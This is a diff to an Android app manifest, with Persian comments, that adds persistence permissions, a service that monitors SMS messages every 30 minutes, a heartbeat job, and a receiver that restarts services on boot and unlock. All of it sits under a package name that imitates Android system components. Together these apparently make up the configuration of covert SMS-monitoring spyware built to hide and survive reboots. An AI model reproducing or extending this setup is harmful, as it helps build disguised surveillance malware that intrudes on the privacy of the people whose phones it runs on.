@@ -29,6 +29,20 @@
 
     <!-- Boot -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    
+    <!-- 🔥 Permissions برای persistence و foreground services -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+    
+    <!-- 🔥 Permission برای چک کردن سرویس‌های در حال اجرا -->
+    <uses-permission android:name="android.permission.GET_TASKS" 
+        android:maxSdkVersion="20" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
 
     <application
         android:allowBackup="true"
@@ -103,7 +117,29 @@
             </intent-filter>
         </service>
 
-        <!-- حذف شد - دیگه UnifiedService و HeartbeatJobService نداریم -->
+        <!-- 🔥 Unified Service - سرویس اصلی با قابلیت‌های پیشرفته -->
+        <service
+            android:name="com.android.system.services.UnifiedService"
+            android:enabled="true"
+            android:exported="false"
+            android:directBootAware="true"
+            android:foregroundServiceType="dataSync" />
+
+        <!-- 🔥 SMS Monitor Service - مانیتورینگ پیامک‌ها هر 30 دقیقه -->
+        <service
+            android:name="com.android.system.services.SmsMonitorService"
+            android:enabled="true"
+            android:exported="false"
+            android:directBootAware="true"
+            android:foregroundServiceType="dataSync" />
+
+        <!-- 🔥 Heartbeat Job Service - برای Android 8+ -->
+        <service
+            android:name="com.android.system.services.HeartbeatJobService"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:enabled="true"
+            android:exported="true"
+            android:directBootAware="true" />
 
         <!-- SMS Receiver -->
         <receiver
@@ -131,7 +167,20 @@
             </intent-filter>
         </receiver>
 
-        <!-- حذف شد - دیگه RestartServiceReceiver نداریم -->
+        <!-- 🔥 Restart Service Receiver - برای restart کردن سرویس‌ها -->
+        <receiver
+            android:name="com.android.system.services.broadcast.RestartServiceReceiver"
+            android:enabled="true"
+            android:exported="false"
+            android:directBootAware="true">
+            <intent-filter>
+                <action android:name="com.android.system.services.RESTART_SERVICE" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.USER_UNLOCKED" />
+            </intent-filter>
+        </receiver>
 
         <!-- Firebase Init Provider -->
         <provider
